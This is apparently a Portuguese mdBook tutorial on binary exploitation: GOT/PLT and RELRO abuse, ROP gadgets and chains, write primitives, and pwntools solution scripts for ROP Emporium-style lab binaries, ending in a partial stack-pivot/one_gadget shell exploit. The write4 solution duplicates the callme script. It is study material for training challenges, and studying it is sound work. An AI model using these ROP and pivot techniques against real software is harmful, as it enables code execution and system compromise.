   0x00005555555552c4 &lt;+29&gt;:	mov    rsi,rcx
   0x00005555555552c7 &lt;+32&gt;:	mov    rdi,rax

b  0x00005555555552ca &lt;+35&gt;:	call   0x555555555150 &lt;mprotect@plt&gt;

   0x00005555555552cf &lt;+40&gt;:	nop
   0x00005555555552d0 &lt;+41&gt;:	pop    rbp
   0x00005555555552d1 &lt;+42&gt;:	ret  
</code></pre>
<p><code>b</code> sao os breakpoints</p>
<p>Em seguida, crie o seguinte gdbscript</p>
<pre><code>disassemble foo

b *foo+14
b *foo+17
b *foo+24
b *foo+35

r
info registers $eax
c
info registers $eax $rcx
c
info registers $rax
c
info registers $edx $rsi $rcx $rdi $rax
</code></pre>
<p>Assim, temos uma visÃ£o de todos os registers afetados na funcao! E fica mais
fÃ¡cil de brincar com o programa, ver o que causa erro, etcetc....</p>
<pre><code class="language-x86asm">Efetivamente, a funcao recebe:
edx = flags
rsi = page size
rdi = addr

Breakpoint 4, 0x00005555555552ca in foo ()
edx            0x2                 2
rsi            0x1000              4096
rdi            0x7ffff7fc7000      140737353904128
</code></pre>
<ul>
<li><a href="print.html#resumo">Resumo</a></li>
<li><a href="print.html#perspectiva-de-atacante">Perspectiva de Atacante</a>
<ul>
<li><a href="print.html#relro-parcial">RELRO Parcial</a></li>
<li><a href="print.html#relro-full">RELRO Full</a></li>
</ul>
</li>
<li><a href="print.html#analise-a-fundo-plt-e-ldso-todo">Analise A Fundo PLT e ld.so ~TODO~</a></li>
</ul>
<a class="header" href="print.html#resumo" id="resumo"><h1>Resumo</h1></a>
<ul>
<li>
<p>A GOT armazena o endereÃ§o da funcao apos ser resolvido!</p>
</li>
<li>
<p>Quando nos chamamos uma funcao do libc, nao estamos chamando elas  diretamente, e sim a sua entrada na PLT.</p>
</li>
<li>
<p>A PLT checa a GOT, caso o endereÃ§o ja tenha sido resolvido, <code>jmp</code> la</p>
</li>
<li>
<p>Caso a funcao <strong>NAO</strong> tenha sido chamada e consequentemente o endereÃ§o ainda
nao tenha sido resolvido, coordena com <code>ld.so</code> para resolver!</p>
</li>
</ul>
<pre><code class="language-x86asm">pwndbg&gt; disassemble vuln
        push   rbp
        mov    rbp,rsp
        sub    rsp,0x20
break &gt; lea    rdi,[rip+0xec3]

        call   0x401030 &lt;puts@plt&gt;

break &gt; lea    rax,[rbp-0x20]
        mov    rdi,rax
        mov    eax,0x0
        call   0x401040 &lt;gets@plt&gt;
        nop
        leave  
        ret

pwndbg&gt; b vuln
pwndbg&gt; b *vuln+20

-------------------------------------
- Antes de puts ter sido executada  -
-------------------------------------

pwndbg&gt; got

GOT protection: Partial RELRO | GOT functions: 2
 
[0x404018] puts@GLIBC_2.2.5 -&gt; 0x401036 (puts@plt+6) â—‚â€” push   0 /* 'h' */
[0x404020] gets@GLIBC_2.2.5 -&gt; 0x401046 (gets@plt+6) â—‚â€” push   1

pwndbg&gt; disassemble 0x401036
    jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 &lt;puts@got.plt&gt;
    push   0x0
    jmp    0x401020


-------------------------------------
- Depois de puts ter sido executada -
-------------------------------------

pwndbg&gt; got

GOT protection: Partial RELRO | GOT functions: 2
 
[0x404018] puts@GLIBC_2.2.5 -&gt; 0x7ffff7e655f0 (puts) â—‚â€” push   r14
[0x404020] gets@GLIBC_2.2.5 -&gt; 0x401046 (gets@plt+6) â—‚â€” push   1

</code></pre>
<a class="header" href="print.html#perspectiva-de-atacante" id="perspectiva-de-atacante"><h1>Perspectiva de Atacante</h1></a>
<a class="header" href="print.html#relro-parcial" id="relro-parcial"><h2>RELRO Parcial</h2></a>
<p>Caso o RELRO seja parcial, nos podemos alterar o valor na got, fazendo uma call
ser redirecionada para, por exemplo, um shellcode!</p>
<p>Esse tipo de cenÃ¡rio pode ser encontrado em vulnerabilidades
<code>escrever-n-bytes---em-algum-lugar</code> !</p>
<p>Alem disso podemos ler ela e obter um leak, descrito no proximo exemplo!</p>
<a class="header" href="print.html#relro-full" id="relro-full"><h2>RELRO Full</h2></a>
<p>Com RELRO Full, nos podemos somente ler a GOT (que ja vem com valores
pre-resolvidos).</p>
<p>Porem isso se mostra util pois, podemos mandar esse endereco de volta
( por meio de um <code>puts</code> por exemplo ) e usar esse leak para desativar ASLR!</p>
<p>Ou podemos calcular a distancia dentro do libc entre a <code>funcao do leak</code> e
<code>system</code>.</p>
<p>Em seguida ajustar esse valor (<code>pop rbp; add rax, rbp</code>, com <code>rax = leak</code>) e chama-lo: <code>call rax</code>, novamente burlando ASLR! :D</p>
<a class="header" href="print.html#analise-a-fundo-plt-e-ldso-todo" id="analise-a-fundo-plt-e-ldso-todo"><h1>Analise A Fundo PLT e ld.so ~TODO~</h1></a>
<a class="header" href="print.html#intro-rop" id="intro-rop"><h1>Intro ROP</h1></a>
<ul>
<li><a href="print.html#intro-rop">Intro ROP</a></li>
<li><a href="print.html#teoria">Teoria</a>
<ul>
<li><a href="print.html#ret">Ret</a></li>
<li><a href="print.html#gadgets">Gadgets</a></li>
<li><a href="print.html#chains">Chains</a></li>
</ul>
</li>
<li><a href="print.html#ferramentas">Ferramentas</a></li>
<li><a href="print.html#curiosidades">Curiosidades</a></li>
</ul>
<p>ROP (programaÃ§Ã£o orientada ao retorno) foi um tÃ©cnica desenvolvida
para burlar todas as limitaÃ§Ãµes e mecanismos de seguranÃ§a
impostos no <code>RIP</code>!</p>
<p>Vamos considerar que todas mitigaÃ§Ãµes exceto <code>PIE</code> estÃ£o ativas!</p>
<a class="header" href="print.html#teoria" id="teoria"><h1>Teoria</h1></a>
<a class="header" href="print.html#ret" id="ret"><h2>Ret</h2></a>
<p>O que faz o <code>RIP</code> ser especial? Em um nÃ­vel abstrato, quais sao
suas propriedades genÃ©ricas que o dao sua funcionalidade??</p>
<ul>
<li>[1] ~ O RIP aponta para um endereÃ§o na memoria</li>
<li>[2] ~ Em seguida, ele age com base no valor presente</li>
<li>[3] ~ Ele automaticamente avanÃ§a (aumenta seu endereÃ§o)</li>
<li>[4] ~ jmp [1]</li>
</ul>
<p>Existe algum outro que possa operar dessa maneira? Sim! o <code>RSP</code>!</p>
<p>Quando o processador executa <code>RET</code>, o endereÃ§o no topo da stack
(aonde <code>RSP</code> aponta) sera colocado no <code>RIP</code> e o <code>RSP</code> se ajusta:
<code>RSP += 8</code>! :D</p>
<a class="header" href="print.html#gadgets" id="gadgets"><h2>Gadgets</h2></a>
<p>Um gadget consiste em uma sequencia de instruÃ§Ãµes, seguidas de um
<code>RET</code>. Por exemplo:</p>
<pre><code class="language-x86asm">gadget_1:
    mov rax rbx
    mov r12 r13
    ret

gadget_2:
    pop rdi
    pop rbp
    ret

</code></pre>
<p>Vamos supor que apos um BoF, o <code>RIP</code> salvo esta num offset de 40.</p>
<pre><code class="language-py">payload = b&quot;A&quot; * 40
payload += gadget_1
payload += b&quot;B&quot; * 8
</code></pre>
<p>Quando a funÃ§Ã£o vulnerÃ¡vel retornar, o valor no topo da stack sera
<code>&amp;gadget_1</code></p>
<pre><code class="language-x86asm">vulnerÃ¡vel:             stack:
    ...                 AAAAAAAA
    leave               ...
    ret     &lt;- RIP      AAAAAAAA
                        gadget_1 &lt;- RSP
                        BBBBBBBB


A execuÃ§Ã£o sera redirecionada, e o RSP ira avanÃ§ar


gadget_1:               stack:
    mov rax rbx &lt;- RIP  AAAAAAAA
    mov r12 r13         ...
    ret                 AAAAAAAA
                        gadget_1
                        BBBBBBBB &lt;- RSP

As duas instruÃ§Ãµes serÃ£o executadas!

gadget_1:               stack:
    mov rax rbx         AAAAAAAA
    mov r12 r13         ...
    ret     &lt;- RIP      AAAAAAAA
                        gadget_1
                        BBBBBBBB &lt;- RSP

E agora, a funcao retornara para BBBBBBBB, um endereÃ§o invalido, gerando uma SEGFAULT
</code></pre>
<p>E caso a instruÃ§Ã£o seja um  <code>POP</code>? o <code>RSP</code> andaria? Sim, e precisamos levar
isso em consideraÃ§Ã£o</p>
<pre><code class="language-py">payload = b&quot;A&quot; * 40
payload += gadget_2
payload += b&quot;T&quot; * 8 # RDI
payload += b&quot;Y&quot; * 8 # RBP
payload += b&quot;B&quot; * 8 # RET
</code></pre>
<p>E vamos supor que os registers sao inicializados com <code>OOOOOOOO</code></p>
<pre><code class="language-x86asm">vulnerÃ¡vel:             stack:              
    ...                 AAAAAAAA
    leave               ...
    ret     &lt;- RIP      AAAAAAAA
                        gadget_2 &lt;- RSP
                        TTTTTTTT
                        YYYYYYYY
                        BBBBBBBB


A execuÃ§Ã£o sera redirecionada, e o RSP ira avanÃ§ar !
Ate aqui foi igual ao anterior!

gadget_2:               stack:              registers:
    pop rdi &lt;- RIP      AAAAAAAA                RDI = OOOOOOOO    
    pop rbp             ...                     RBP = OOOOOOOO
    ret                 AAAAAAAA
                        gadget_2
                        TTTTTTTT &lt;- RSP
                        YYYYYYYY 
                        BBBBBBBB

pop rdi sera executado, salvando o valor no topo da stack em RDI e avanÃ§ando RSP

gadget_2:               stack:              registers:
    pop rdi             AAAAAAAA                RDI = TTTTTTTT    
    pop rbp &lt;- RIP      ...                     RBP = OOOOOOOO
    ret                 AAAAAAAA
                        gadget_2
                        TTTTTTTT 
                        YYYYYYYY &lt;- RSP
                        BBBBBBBB


pop rbp sera executado, salvando o valor no topo da stack em RBP e avanÃ§ando RSP

gadget_2:               stack:              registers:
    pop rdi             AAAAAAAA                RDI = TTTTTTTT    
    pop rbp             ...                     RBP = YYYYYYYY
    ret     &lt;- RIP      AAAAAAAA
                        gadget_2
                        TTTTTTTT 
                        YYYYYYYY
                        BBBBBBBB &lt;- RSP

E agora, a funcao retornara para BBBBBBBB, um endereÃ§o invalido, gerando uma SEGFAULT
</code></pre>
<a class="header" href="print.html#chains" id="chains"><h2>Chains</h2></a>
<p>E se, ao invÃ©s de retornarmos para <code>BBBBBBBB</code>, retornÃ¡ssemos para outro gadget?</p>
<p>Seria tipo uma corrente:</p>
<p>___com um gadget executando e redirecionando para o proximo....</p>
<p>___com um gadget executando e redirecionando para o proximo....</p>
<p>___com um gadget executando e redirecionando para o proximo....</p>
<p>___com um gadget executando e redirecionando para o proximo....</p>
<p>Assim, poderÃ­amos devagarinho reconstruir o nosso shellcode, a partir de partes
pre-existentes do cÃ³digo!</p>
<p>E como <code>PIE</code> esta desativado, a secao de cÃ³digo do binÃ¡rio NAO tem seu
endereÃ§o randomizado!</p>
<blockquote>
<p>OBS: Voce nao pode usar a secao de cÃ³digo do libc como gadgets, pois ele tem
o endereÃ§o randomizado (ASLR)</p>
</blockquote>
<pre><code class="language-x86asm">gadget_1:
    mov rax rbx
    mov r12 r13
    ret

gadget_2:
    pop rdi
    pop rbp
    ret
</code></pre>
<pre><code class="language-py">payload = b&quot;A&quot; * 40
payload += gadget_1
payload += gadget_2 
payload += b&quot;T&quot; * 8 # RDI
payload += b&quot;Y&quot; * 8 # RBP
payload += gadget_1
payload += gadget_1
payload += gadget_1
payload += gadget_2 
payload += b&quot;T&quot; * 8 # RDI
payload += b&quot;Y&quot; * 8 # RBP
payload += gadget_1
payload += b&quot;B&quot; * 8 # SEGFAULT
</code></pre>
<p>Essa chain em especifico nao faz nada de util, somente demonstrar como chains
podem ser construidas!</p>
<p>Numa situaÃ§Ã£o real nao terÃ­amos uma <code>SEGFAULT</code> no final, pois ja terÃ­amos uma
shell antes de chegar a esse ponto!</p>
<a class="header" href="print.html#ferramentas" id="ferramentas"><h1>Ferramentas</h1></a>
<p>Existem mÃºltiplas ferramentas capazes de encontrar gadgets e ate gerar chains
automaticamente!</p>
<p>Eu recomendo voce testar e ver o que prefere!</p>
<ul>
<li><a href="https://github.com/Boyan-MILANOV/ropium">ropium</a></li>
<li><a href="https://github.com/sashs/Ropper">ropper</a></li>
<li><a href="https://github.com/JonathanSalwan/ROPgadget">ropGadget</a></li>
<li><a href="https://docs.pwntools.com/en/latest/rop.html">O submodulo do pwntools</a></li>
</ul>
<hr />
<p>E enquanto eu pegava os links no github..
eu encontrei esse em rust:
<a href="https://github.com/Ben-Lichtman/ropr/tree/master/src">ropr</a></p>
<p>Que parece ser bem interessante, mas ainda vou testar!</p>
<hr />
<p>Todas as ferramentas possuem funcionalidade de filtrar gadgets com badchars,
automaticamente gerar chains...</p>
<p>Eu pessoalmente gosto de ropper e do pwntools (pq ter tudo dentro do mesmo
framework == incrÃ­vel)</p>
<a class="header" href="print.html#curiosidades" id="curiosidades"><h1>Curiosidades</h1></a>
<p>Em arquiteturas <code>RISC</code>, todas as instruÃ§Ãµes tem o mesmo tamanho (em bytes)...</p>
<p>Porem em <code>x86</code> (<code>CISC</code>), as instruÃ§Ãµes podem desde 2 bytes, ate 5/6/7 bytes!</p>
<p>Assim, as ferramentas que encontram gadgets podem criar instruÃ§Ãµes que
originalmente nao existiam no programa!</p>
<pre><code>Exemplo (fictÃ­cio, pq eu to com preguiÃ§a ler o manual e ver os bytecodes)

O programa originalmente ve:

12 34   56 78 91    12 34  90
|       |           |      |
Add     Pop         Add    NOP

Porem, a ferramenta pode escolher um offset com alinhamento diferente do anterior:

12      34 56 78    91 12   34 90
|       |           |       |
AND     Sub         Push    XOR

Mesmos bytes, instruÃ§Ãµes diferentes

</code></pre>
<ul>
<li><a href="print.html#primitivos">Primitivos</a></li>
<li><a href="print.html#classifica%C3%A7%C3%A3o">ClassificaÃ§Ã£o</a>
<ul>
<li><a href="print.html#write---what---where">Write - What - Where</a>
<ul>
<li><a href="print.html#exemplo">Exemplo</a></li>
</ul>
</li>
<li><a href="print.html#write---something---where">Write - Something - Where</a></li>
<li><a href="print.html#modificador">Modificador</a></li>
</ul>
</li>
<li><a href="print.html#incomuns">Incomuns</a></li>
<li><a href="print.html#dicas">Dicas</a>
<ul>
<li><a href="print.html#valores-pre-modificados">Valores pre modificados</a></li>
<li><a href="print.html#alinhamento-da-stack">Alinhamento da stack</a></li>
</ul>
</li>
</ul>
<a class="header" href="print.html#primitivos" id="primitivos"><h1>Primitivos</h1></a>
<p>Primitivos sao a base dos exploits modernos, um primitivo pode ser desde uma
sequencia especifica de gadgets, funÃ§Ãµes, etcetc.</p>
<p>Normalmente, voce vai adicionar funÃ§Ãµes aos seus scripts que usem o primitivo,
acelerando a velocidade de desenvolvimento dos exploits.</p>
<a class="header" href="print.html#classificaÃ§Ã£o-1" id="classificaÃ§Ã£o-1"><h1>ClassificaÃ§Ã£o</h1></a>
<a class="header" href="print.html#write---what---where" id="write---what---where"><h2>Write - What - Where</h2></a>
<p>Esse primitivo te permite escrever algo (what) em algum lugar, esse algo pode
ser desde 1 byte, ate uma qword inteira!</p>
<a class="header" href="print.html#exemplo" id="exemplo"><h3>Exemplo</h3></a>
<p>Uma chain que escreve um byte em um local:</p>
<pre><code class="language-x86asm">gadget_pop_rdi:
    pop rdi
    ret

gadget_pop_rax:
    pop r13
    pop rax
    pop r12
    xor r13 r12
    ret

gadget_mov_rdi_al:
    mov [rdi] al
    pop r14
    ret
</code></pre>
<p>Gadgets normalmente nao sao exatamente o que a gente precisa, entÃ£o as vezes
precisamos ocupar a stack com &quot;lixinho&quot; para compensar!</p>
<p>Sim... esse e o nome tÃ©cnico correto! E nao tem argumento que me va me
convencer do contrario!</p>
<pre><code class="language-py">def write_byte(what, where);
    temp = b&quot;&quot;                  # Lixo  # Util
    temp += gadget_pop_rdi      
    temp += p64(where)                  # rdi
    temp += gadget_pop_rax      
    temp += b&quot;A&quot;*8              # r13
    temp += p64(what)                   # rax
    temp += b&quot;B&quot;*8              # r12
    temp += gadget_mov_rdi_al           # mov [rdi] al
    temp += b&quot;C&quot;*8              # r14
    
    return temp
</code></pre>
<p>E nos poderÃ­amos usar assim:</p>
<pre><code class="language-py">payload = b'A'*40
data_seg = 0x00601028
for c in b&quot;/bin/sh\x00&quot;:
    payload += write_byte(c, data_seg)
    data_seg += 1

payload += gadget_pop_rdi
payload += p64(0x00601028)    # data_seg inicial: pointer para /bin/sh
payload += p64(libc.sym.system) 
</code></pre>
<a class="header" href="print.html#write---something---where" id="write---something---where"><h2>Write - Something - Where</h2></a>
<p>Voce escreve alguma coisa (voce nao controla) em algum lugar (voce controla)</p>
<p>o <code>mov [rdi] al</code> poderia ser substituÃ­do por:
<code>mov [rdi] 0x7f 1e 1f 60 00 00 00 00</code></p>
<p>Assim, podemos escrever esse valor fixo, em um endereÃ§o que nos controlamos!</p>
<p>Pode util ser em ROP chains caso voce possua um modificador.</p>
<p>Uma fonte comum desse primitivo sao unlinks parciais no heap (unsorted bins attack)</p>
<a class="header" href="print.html#modificador" id="modificador"><h2>Modificador</h2></a>
<p>add, xor, sub, .... todas essas instruÃ§Ãµes nos permitem alterar os bytes que
ja estÃ£o na memoria!</p>
<p>E similar aos writes, a quantidade de controle que possuÃ­mos pode variar!</p>
<p><code>pop rdx; add [rdx] 0x02;</code> Somente controlamos o endereÃ§o!</p>
<p>Caso tenhamos um <code>xor</code>, a situaÃ§Ã£o ideal seria a memoria = <code>0xff</code></p>
<p>Caso seja um <code>add</code>, e a memoria <code>0x00</code>, nos possuÃ­mos um write super simples!</p>
<p>E assim por diante!</p>
<a class="header" href="print.html#incomuns" id="incomuns"><h1>Incomuns</h1></a>
<p>Existem outros primitivos que sao mais raros, entÃ£o somente irei explicar
quando for util. Por exemplo o <code>write refletido</code>: explicado no
tutorial de unsafe unlink!</p>
<p>Porem vou colocar os links aqui caso voce esteja procurando por algum especifico! :D</p>
<a class="header" href="print.html#dicas" id="dicas"><h1>Dicas</h1></a>
<a class="header" href="print.html#valores-pre-modificados" id="valores-pre-modificados"><h2>Valores pre modificados</h2></a>
<p>Similar ao lixinho para os <code>pops</code>, e eu nao sabia aonde colocar! hehe :D</p>
<p>As vezes, um gadget muito util acaba tendo efeito colateral nos nossos valores!</p>
<p>Por exemplo, vamos supor que somente exista um gadget que nos permita alterar rdi!</p>
<pre><code class="language-x86asm">gadget_rdi:
    pop rdi
    add rdi 0x1234 
    ret

gadget_pop_rax:
    pop r13
    pop rax
    pop r12
    xor r13 r12
    ret

gadget_mov_rdi_al:
    mov [rdi] al
    pop r14
    ret
</code></pre>
<p>Os outros gadgets estÃ£o inalterados!</p>
<pre><code class="language-py">def write_byte(what, where);
    temp = b&quot;&quot;                  # Lixo  # Util
    temp += gadget_pop_rdi


    temp += p64(where - 0x1234)         # rdi
    
    
    temp += gadget_pop_rax      
    temp += b&quot;A&quot;*8              # r13
    temp += p64(what)                   # rax
    temp += b&quot;B&quot;*8              # r12

    temp += b&quot;B&quot;*8              # r12
    temp += gadget_mov_rdi_al           # mov [rdi] al
    temp += b&quot;C&quot;*8              # r14
    
    return temp
</code></pre>
<a class="header" href="print.html#alinhamento-da-stack" id="alinhamento-da-stack"><h2>Alinhamento da stack</h2></a>
<p>Voce precisa garantir o alinhamento da stack de acordo com a arquitetura:</p>
<ul>
<li>x86 -&gt; 4 bytes -&gt; p32()</li>
<li>x86_64 -&gt; 8 bytes -&gt; p64()</li>
</ul>
<p>Mesmo que o valor seja so um byte, voce precisa garantir o alinhamento da
stack! Pois o <code>pop</code> vai retirar 4 ou 8 bytes independentemente! Assim,
estragando o endereÃ§o do proximo gadget na chain!</p>
<p>Caso o bytes va para <code>al</code>, <code>p64(0x41)</code>ja basta!</p>
<p>Mas caso o valor para <code>al</code> voce precisa fazer <code>p64(0x4100)</code> ou <code>b&quot;\x00&quot;*7 + b&quot;\x41&quot; + b&quot;\x00&quot;</code></p>
<p>Aqui tao minhas solucoes, em breve vou escrever um tutorial, mas por enquanto
e isso :(</p>
<ul>
<li><a href="print.html#sha256">sha256</a></li>
<li><a href="print.html#ret2win">ret2win</a></li>
<li><a href="print.html#split">split</a></li>
<li><a href="print.html#callme">callme</a></li>
<li><a href="print.html#write4">write4</a></li>
<li><a href="print.html#badchars">badchars</a></li>
<li><a href="print.html#fluff">fluff</a></li>
</ul>
<a class="header" href="print.html#sha256" id="sha256"><h1>sha256</h1></a>
<p>E as sha256 pq eu percebi q os desafios foram alterados com o passar do tempo</p>
<pre><code>$ sha256sum 0-ret2win/ret2win 1-split/split 1-split/split 2-callme/callme 3-write4/write4 4-badchars/badchars 5-fluff/fluff

824893a58502620cbfe8bce7d362cf96b5eb484b78291b1371fd7a2b8086c1d6  0-ret2win/ret2win
bf9af5d3618c33c800f577065a4773fb12b6e88390552dd766efa013ebad40f9  1-split/split
bf9af5d3618c33c800f577065a4773fb12b6e88390552dd766efa013ebad40f9  1-split/split
38b3aac5f11e673ecfbe344f9330d7dfa7d6921be506a948ab9d0347af756acb  2-callme/callme
15c9fc1d4dff1874633caebd212d4990243b072f9352baa23daf07f39a93f8cd  3-write4/write4
5308289f3937a34e4c5eac818e394217f5f22c6f21fbb0f6dc6b8e3f771deb8b  4-badchars/badchars
e5335795104d861dc5e54c8734e090f1c7dfd5b642e4607c2747aed7529c724d  5-fluff/fluff
</code></pre>
<a class="header" href="print.html#ret2win" id="ret2win"><h1>ret2win</h1></a>
<pre><code>O programa fala o tamanho ate o RIP (40), e vocÃª pode usar o truque mencionado
no enunciado para testar.

Ai Ã© sÃ³ usar objdump |  grep ret2win para pegar o endereÃ§o
     python3 -c &quot;print('A'*40+'\x56\x07\x40',end='')&quot; |./ret2win 
Truque pra tirar a newline (se nÃ£o, nÃ£o funciona)
</code></pre>
<a class="header" href="print.html#split" id="split"><h1>split</h1></a>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

    # sys arg on RDI
    # https://godbolt.org/z/691asM

#gadgets
system = p64(0x40074b)
# gdb&gt; print system:  0x400560
# That one is a addr to call_system (usefulFunction)

# ROPgadget or ropium
pop_rdi_ret = p64(0x4007c3)

# strings
# rabin -z   or   r2&gt; iz 
ls = p64(0x0040084a)
cat = p64(0x00601060)

buf = b'A'*40 # Pad
# buf += p64(0x00400742)
# usefulFunction -&gt; test offset
buf += pop_rdi_ret
buf += cat
buf += system

binary = ELF(&quot;./split&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)
io.sendline(buf)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recvuntil(&quot;}&quot;))
io.close()k
</code></pre>
<a class="header" href="print.html#callme" id="callme"><h1>callme</h1></a>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

# Strings
args = p64(0xdeadbeefdeadbeef)
args += p64(0xcafebabecafebabe)
args += p64(0xd00df00dd00df00d)

# Gadgets
useful = p64(0x000000000040093c)
    # pop rdi, rsi, rdx
    # calling convention:
    #    rdi rsi rdx rcx

# Funcs (gdb print)
callone = p64(0x7ffff7dc881a)
calltwo = p64(0x7ffff7dc892b)
callthree = p64(0x7ffff7dc8a2d)

payload = b'A'*40
for func in [callone, calltwo, callthree]:
    payload += useful
    payload += args
    payload += func


binary = ELF(&quot;./callme&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)
io.sendline(payload)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recv(512))
io.close()
</code></pre>
<a class="header" href="print.html#write4" id="write4"><h1>write4</h1></a>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

# Strings
args = p64(0xdeadbeefdeadbeef)
args += p64(0xcafebabecafebabe)
args += p64(0xd00df00dd00df00d)

# Gadgets
useful = p64(0x000000000040093c)
    # pop rdi, rsi, rdx
    # calling convention:
    #    rdi rsi rdx rcx

# Funcs (gdb print)
callone = p64(0x7ffff7dc881a)
calltwo = p64(0x7ffff7dc892b)
callthree = p64(0x7ffff7dc8a2d)

payload = b'A'*40
for func in [callone, calltwo, callthree]:
    payload += useful
    payload += args
    payload += func


binary = ELF(&quot;./callme&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)
io.sendline(payload)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recv(512))
io.close()
</code></pre>
<a class="header" href="print.html#badchars" id="badchars"><h1>badchars</h1></a>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

binary = ELF(&quot;./badchars&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)

# But on data+6 there is a bad byte on the addr
# Because we wouldnt be able to fix the bad byte if the addr was also bad, we do a +3
# Other solutions:
#       If we had a-&gt; add [REG+123whatever] 123whatever
#       or walking with inc-&gt; REG=data_seg; 6*(inc REG); add [reg] 122whatever
#       maybe ret2csu?

# Gadgets (usefulGadgets + ropper --file badchars -b 7867612e)
write8_r13_r12 = p64(0x0000000000400634)
pop_r12_r13 = p64(0x000000000040069c)  # r12 r13 r14 r15
pop_rdi = p64(0x00000000004006a3)
pop_r14_r15 = p64(0x00000000004006a0)
sub1_r15_r14b = p64(0x0000000000400630)

bad = [ord('x'), ord('g'), ord('a'), ord('.')]
data_seg = 0x00601028 +3

# Funcs
def arbwrite8(addr, val): 
    temp = pop_r12_r13 +val +p64(addr)
    temp += b'B'*16 # fill r14 r15 
    return temp + write8_r13_r12
def arbsub1(addr, val): return pop_r14_r15 +val*8 +p64(addr) +sub1_r15_r14b

# Initial write
payload = b'A'*40
payload += arbwrite8(data_seg, b&quot;\xff/fl\xff\xff\xfft&quot;) # FF as placeholder
payload += arbwrite8(data_seg+8, b&quot;\xfft&quot;+b'\x00'*6)

# Fix bad bytes
payload += arbsub1(data_seg+0, b'\xd1') # .
                                        # /
                                        # f
                                        # l
payload += arbsub1(data_seg+4, b'\x9e') # a
payload += arbsub1(data_seg+5, b'\x98') # g
payload += arbsub1(data_seg+6, b'\xd1') # . # addr contains bad char w/o shift
                                        # t
payload += arbsub1(data_seg+8, b'\x87') # x
                                        # t
# Load pointer and call print_file
payload += pop_rdi
payload += p64(data_seg)
payload += p64(io.elf.plt['print_file'])

io.sendline(payload)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recv(512))
io.close()
</code></pre>
<a class="header" href="print.html#fluff" id="fluff"><h1>fluff</h1></a>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

# https://www.felixcloutier.com/x86/xlat:xlatb
# https://www.tutorialspoint.com/assembly_programming/assembly_stos_instruction.htm
# https://www.felixcloutier.com/x86/bextr

binary = ELF(&quot;./fluff&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)

# Gadgets
bextr_rbx = p64(0x000000000040062a)
    # pop    rdx	
    # pop    rcx
    # add    rcx,0x3ef2
    # bextr  rbx,rcx,rdx

xlat_al_rbx = p64(0x0000000000400628)
# Set AL to memory byte [RBX + unsigned AL].

pop_rdi = p64(0x00000000004006a3)
stosb_rdi_al = p64(0x0000000000400639) 

# funcs
def mov_rbx(val):
    rcx = p64(val - 0x3ef2)
    rdx = p64(0x4000)
    # [0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    #  |                       |                 |
    #  16    num_bits=64       7  start_bit=0    0
    # bextr will copy 64 bits from rcx, 
    # starting on bit 0. Then save it on rbx
    return bextr_rbx +rdx +rcx

payload = b'A'*40
al = 0xb # al starts = 0xb
data_seg = 0x00601028
for c in b&quot;flag.txt&quot;:
    # Load char to al
    b = next(binary.search(c)) - al
    payload += mov_rbx(b)
    payload += xlat_al_rbx
    al = c

    # Load addr to rdi
    payload += pop_rdi
    payload += p64(data_seg)
    data_seg += 1

    # write
    payload += stosb_rdi_al

payload += pop_rdi
payload += p64(0x00601028)
payload += p64(io.elf.plt['print_file'])

io.sendline(payload)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recv(512))
io.close()
</code></pre>
<a class="header" href="print.html#pivot" id="pivot"><h1>Pivot</h1></a>
<pre><code>3d3523f651e7730be0c7c2347ab109dd0842dc29cec3d5fe0c868afc6803026c  pivot
8de035bdc097b881c2118c09ce995b78f49019582cfe6e1b3a584dbebe1c3481  libpivot.so
</code></pre>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *
from time import sleep

# --------------------------------------------------  
# Inicializar
# --------------------------------------------------  
if args.LOG: context.log_level = &quot;info&quot;
else       : context.log_level = &quot;critical&quot;

binary = ELF(&quot;pivot&quot;)
libc = binary.libc

io = process(binary.path)
io.recvuntil(&quot;pivot: &quot;)
leak = int(io.recv(14)[2::],16)
log.info(&quot;Leak: &quot;+hex(leak))

io.recvuntil(&quot;&gt; &quot;)

# --------------------------------------------------  
# Gadgets
# --------------------------------------------------
# Misc
pop_rdi = p64(0x0000000000400a33) 
pop_rax = p64(0x00000000004009bb)
pop_rbp = p64(0x00000000004007c8)
add_rax_rbp = p64(0x00000000004009c4) 
pop_rsi_r15 = p64(0x0000000000400a31) 


# Pivot
xchg_rsp = p64(0x00000000004009bd) # xchg rax, rsp; ret; 

# Read
mov_eax_rax = p64(0x00000000004009c1) # mov eax, dword ptr [rax]; ret;

# Exec
call_rax = p64(0x00000000004006b0) # call rax; depois coloca um lixin p64 
pop_r12_13_14_15 = p64(0x0000000000400a2c) 
one_gadget = 0xcbd1a
# 0xcbd1a execve(&quot;/bin/sh&quot;, r12, r13)
# constraints:
 # [r12] == NULL || r12 == NULL
 # [r13] == NULL || r13 == NULL

# --------------------------------------------------  
# Primeira Fase
# --------------------------------------------------  
fase1 = b&quot;&quot;
fase1 += b&quot;B&quot;*40
fase1 += pop_rax   
fase1 += p64(leak) # leak == fase2
fase1 += xchg_rsp  # rsp == fase2

# Entao, caso coloquemos uma ROP chain no leak, ela sera executada

# --------------------------------------------------  
# Segunda Fase
# --------------------------------------------------  
def get_shell():
    fase2 = b''
    # Ler a got de puts
    fase2 += pop_rax 
    fase2 += p64(binary.got.puts)
    fase2 += mov_eax_rax # mov eax [rax]

    # agora temos o FINAL de puts em rax
    # inicio do puts == ao do leak
    # Entao podemos calcular o resto dele a partir do leak
    # leak  = 0x7fb5       27 4a 9f 10 
    # final = 0x           27 52 45 f0
    # (leak &gt;&gt; 4*8  &lt;&lt; 4*8) + final_puts == puts
    # 0x7fb500000000 + final_puts = 0x7fb5275245f0 (puts)

